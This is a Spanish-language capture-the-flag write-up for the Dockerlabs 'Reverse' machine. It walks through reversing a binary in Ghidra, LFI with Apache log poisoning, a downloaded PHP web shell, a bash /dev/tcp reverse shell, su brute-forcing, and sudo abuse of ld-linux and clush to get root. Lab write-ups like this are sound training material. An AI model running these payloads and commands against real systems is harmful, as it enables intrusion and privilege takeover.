
# Writeup Template: Maquina `[ Reverse ]`

- Tags: #Reverse #Reversing
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Reverse](https://mega.nz/file/XYswTACa#7HR7EZlUXRIITV5eisEVvegFiCi-biVi0tYR5VD1uDQ)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x reverse.zip
sudo bash auto_deploy.sh reverse.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```
---

## Enumeracion de [Servicio  Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,backup,txt,sh,html
```

- **Hallazgos**:
	No reporta nada critico

Revisando el codigo fuente de la web principal tenemos:
```bash
 <!-- Incluir el archivo JavaScript -->
 <script src="[./js/script.js](view-source:http://172.17.0.2/js/script.js)"></script>
```

Si ingresamos a esa ruta encontramos este fragmento de codigo en js:
```bash
let clickCount=0;const particleContainer=document.getElementById("particles");function createParticle(t,e){const n=document.createElement("div");n.classList.add("particle");n.style.left=`${t}px`;n.style.top=`${e}px`;n.style.width=`${Math.random()*10+5}px`;n.style.height=n.style.width;n.style.animationDuration=`${Math.random()*2+1}s`;particleContainer.appendChild(n);setTimeout((()=>{n.remove()}),3e3)}document.body.addEventListener("mousemove",(t=>{createParticle(t.clientX,t.clientY)}));document.body.addEventListener("click",(function(){clickCount++;if(clickCount>=20){alert("secret_dir");clickCount=0}}));
```

En el codigo indica que si damos mas de 20 veces clic en la pagina de incio con un **alert** mostrara un mensaje:
```bash
secret_dir
```

Tenemos el nombre de un directorio que verificaremos si existe:
```bash
http://172.17.0.2/secret_dir/
```

Vemos que existe y tiene un archivo: **( secret )** que al darle clic se nos descarga:
revisando su contenido vemos que es un archivo de tipo binario:
```bash
file secret
secret: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=387271a4e7dae83df80c4ca4453a3163c48d834f, for GNU/Linux 3.2.0, not stripped
```

Le damos permisos de ejecucion:
```bash
chmod +x secret
```

Al ejecutarlo nos pide una contrasena que no sabemos cual es:
```bash
./secret

Introduzca la contraseña: root
Recibido...
Comprobando...
Contraseña incorrecta...
```

### Uso `Ghidra` para `Ingenieria Reversa`
#### Pasos:
1. **Crear proyecto**:
   - `File > New Project` (non-shared)
2. **Importar binario**:
   - `File > Import File`
   - Seleccionar archivo (ej: `malware.exe`)
   - Opciones: "Format" (Detect), "Language" (auto-detectado)
3. **Analizar**:
   - Doble click en archivo importado
   - Aceptar análisis automático

Una ves correcto todo filtraremos el el buscardor por:
```bash
main
```

Revisando la funcion principal **main** vemos que esta realizando una llamada a una funcion **containsRequiredChars**:
```bash
  std::chrono::duration<>::duration<int,void>(local_58,&local_4c);
  std::this_thread::sleep_for<>((duration *)local_58);
  cVar1 = containsRequiredChars(local_78)
```

Damos doble clic para que nos rediriga a esta funcion **containsRequiredChars**
Para ver los valores de los strings ocultos en las direcciones como `&DAT_0057e081`, `&DAT_0057e083` y `&DAT_0057e08d` en Ghidra
- Haz doble clic en `&DAT_0057e081` en el código desensamblado
- Esto te llevará a la ubicación en memoria (0x0057e081)
- Selecciona los bytes desde esa dirección
- Click derecho > **Data** > **TerminatedCString**

Ahora si que tenemos los valores en string:
```bash
  std::__cxx11::basic_regex<>::basic_regex(local_b8,"@",0x10);
  bVar4 = std::regex_search<>(param_1,local_b8,0);
  if (bVar4) {
    std::__cxx11::basic_regex<>::basic_regex(local_98,"Mi",0x10);
    bVar3 = true;
    bVar4 = std::regex_search<>(param_1,local_98,0);
    if (bVar4) {
      std::__cxx11::basic_regex<>::basic_regex(local_78,"S3cRet",0x10);
      bVar2 = true;
      bVar4 = std::regex_search<>(param_1,local_78,0);
      if (bVar4) {
        std::__cxx11::basic_regex<>::basic_regex(local_58,"d00m",0x10);
```

Si conctatenamos estos valores vemos que se forma la siguiente cadena:
```bash
@MiS3cRetd00m
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Con la herramienta **Ghidra** logramos determinar cual es la contrasena para el binario, Al cual volveremos a ejectar:
```bash
./secret
Introduzca la contraseña: @MiS3cRetd00m
Recibido...
Comprobando...
```

Nos retorna este mensaje en base64:
```bash
Contraseña correcta, mensaje secreto:
ZzAwZGowYi5yZXZlcnNlLmRsCg==
```

El mensaje es un subdomino que tendremos que agregar en nuestro archivo: **( /etc/hosts )**
```bash
172.17.0.2 g00dj0b.reverse.dl
```

Ahora ingresamos a esa **url** para ver el servicio web:
```bash
http://g00dj0b.reverse.dl
```

Revisando el codigo fuente tenemos:
```bash
<li><a href="[daily_idea.php](view-source:http://g00dj0b.reverse.dl/daily_idea.php)">Idea del Día</a></li>
<li><a href="[lab.php](view-source:http://g00dj0b.reverse.dl/lab.php)">Laboratorio</a></li>
<li><a href="[community.php](view-source:http://g00dj0b.reverse.dl/community.php)">Comunidad</a></li>
<li><a href="[resources.php](view-source:http://g00dj0b.reverse.dl/resources.php)">Recursos</a></li>
<li><a href="[experiments.php?module=./modules/default.php](view-source:http://g00dj0b.reverse.dl/experiments.php?module=./modules/default.php)">Experimentos Interactivos</a></li>
```

Ingresando a esta url tenemos lo siguiente:
```bash
http://g00dj0b.reverse.dl/experiments.php?module=./modules/default.php
```

Realizaremos un ataque de **fuzzing** para determinar si es vulnerable el parametro module:
```bash
http://g00dj0b.reverse.dl/experiments.php?module=
```

### Ejecucion del Ataque
```bash
# Comandos para explotación
wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://g00dj0b.reverse.dl/experiments.php?module=FUZZ" --hw 28,13,0
```

Tenemos un **LFI** de manera que intentaremos ver si podemos acceder a una de estas rutas:

| Ruta                          | Descripción               | Explotación            |
| ----------------------------- | ------------------------- | ---------------------- |
| `/var/log/apache2/access.log` | Logs de acceso de Apache  | Log Poisoning/RCE      |
| `/var/log/apache2/error.log`  | Logs de error de Apache   | Log Poisoning/RCE      |
| `/var/log/nginx/access.log`   | Logs de acceso de Nginx   | Log Poisoning/RCE      |
| `/var/log/auth.log`           | Logs de autenticación     | Credenciales filtradas |
| `/var/log/syslog`             | Log principal del sistema | Información diversa    |
| `/var/log/mail.log`           | Logs de correo            | Información de correo  |
Tenemos exito con una ya que nos permite ver los **logs** del sistema asi que lo podemos derivar a un **LogPoisoning**
```bash
http://g00dj0b.reverse.dl/experiments.php?module=/var/log/apache2/access.log
```

Ahora envenenaremos los **logs** del sistema:
```bash
curl -s X GET http://172.17.0.2/ -A '<?php system("id") ?>'
```

En el log veremos que se a ejecutado correctamente nuestro comando::
```bash
un/2025:20:15:11 +0000] "GET /experiments.php?module=/var/log/apache2/access.log HTTP/1.1" 200 483 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" 172.17.0.1 - - [10/Jun/2025:20:15:48 +0000] "GET / HTTP/1.1" 200 2030 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm) "
```

Creamos un archivo malicioso que nos otorgue una **revershell** bajo el nombre: **( cmd.php )**
```php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Nos montamos un servidor con python por el puerto 80
```bash
python3 -m http.server
```

Ahora realizamos la peticion para que sea cargado nuestro archivo maliciso
```bash
curl http://172.17.0.2 -A "<?php system('wget 172.17.0.1/cmd.php -O /var/www/html/cmd.php') ?>" 
```

Recargamos el log del sisitma y aqui estara nuestro archivo maliciosos:
```bash
http://172.17.0.2/cmd.php?cmd=whoami
```
### Intrusion
Nos ponemos en escucha para ganar acceso al target
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
172.17.0.2/cmd.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261''
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
sudo -l
```

**Hallazgos Clave:**
```bash
User www-data may run the following commands on a840807eeae9:
    (nova : nova) NOPASSWD: /opt/password_nova # tenemos una via potencial de migrar a este usuario.
```

### Explotacion de Privilegios

###### Usuario `[ www-data ]`:

```bash
# Comando para escalar al usuario: ( nova )
sudo -u nova /opt/password_nova
```

Nos dice que la contrasena para estu usuario esta en el **rockyou** asi que nos transferimos estas dos herramientas a la maquina victima para realizar un ataque de fuerza bruta.
Realizamos una copia de las herramientas:
```bash
cp /usr/bin/Sudo_BruteForce/Linux-Su-Force.sh .
cp /usr/share/wordlists/rockyou.txt .
```

Nos montamos un servidor python
```bash
python3 -m http.server 80
```

Realizamos la peticion para descargar las herramientas en la maquina victima:
```bash
wget http://172.17.0.1/Linux-Su-Force.sh
wget http://172.17.0.1/rockyou.txt
```

Ahora que tenemos las herramientas, Procedemos con el ataque:
```bash
bash Linux-Su-Force.sh nova rockyou.txt
```

Tenemos la contrasena:
```bash
BlueSky_42!NeonPineapple
```
###### Usuario `[ nova ]`:
Listando los permosos del usuario:
```bash
sudo -l

User nova may run the following commands on a840807eeae9:
    (maci : maci) NOPASSWD: /lib64/ld-linux-x86-64.so.2 # Tenemos una via potencial de migrar a este usuario.
```
### 1. **Crear un binario malicioso**
Para migrar al usuario `maci` aprovechando el permiso de `sudo` configurado, sigue estos pasos:
Ejecuta este comando para generar un binario que te otorgue una shell como `maci`:
```bash
cat << 'EOF' > /tmp/exploit.c
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
EOF
```

Luego compilamos el exploit:
```bash
gcc -o /tmp/exploit /tmp/exploit.c
```

### 2. **Ejecutamos el exploit**
Usamos el cargador dinámico (`ld-linux-x86-64.so.2`) para ejecutar tu binario malicioso con los privilegios de `maci`:
```bash
sudo -u maci /lib64/ld-linux-x86-64.so.2 /tmp/exploit
```

### 3. **Verificar el usuario**
Una vez ejecutado, verifica que ahora somos `maci`:
```bash
whoami  
```

### Explicacion:
- **`/lib64/ld-linux-x86-64.so.2`** es el cargador dinámico de Linux, que puede ejecutar cualquier binario ELF.
- El binario `/tmp/exploit` fuerza una shell con los permisos de `maci` mediante `setuid()` y `setgid()`.
- La entrada en `sudoers` permite ejecutar el cargador como `maci` sin contraseña.

###### Usuario `[ maci ]`:
Listamos los permisos para este usuario:
```bash
User maci may run the following commands on a840807eeae9:
    (ALL : ALL) NOPASSWD: /usr/bin/clush # Tenemos una via potencial de migrar a este usuario.
```

Par explotar este binario tenemos que realizar lo siguiente:
```bash
sudo -u root /usr/bin/clush -w node[11-14] -b
```

Ejecutando comandos:
```bash
clush> !whoami
LOCAL: root
```

Ahora ejecutamos este para otorgar privielgios SUID a la bash de **root**
```bash
!/bin/bash -c 'chmod u+s /bin/bash'
```

Listamos los permiso de la **bash**
```bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

Ahora solo lanzamos el siguiente comando:
```bash
bash -p
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.2# whoami
root
```

---

## Lecciones Aprendidas
1. Nos adentramos en el mundo de la **ingenieriaReversa**
2. Aprendimos a usar **Ghidra** para aplicar **ingenieriaReversa** para obtener informacion valiosa.
3. Aprendimos a usar **Ghidra**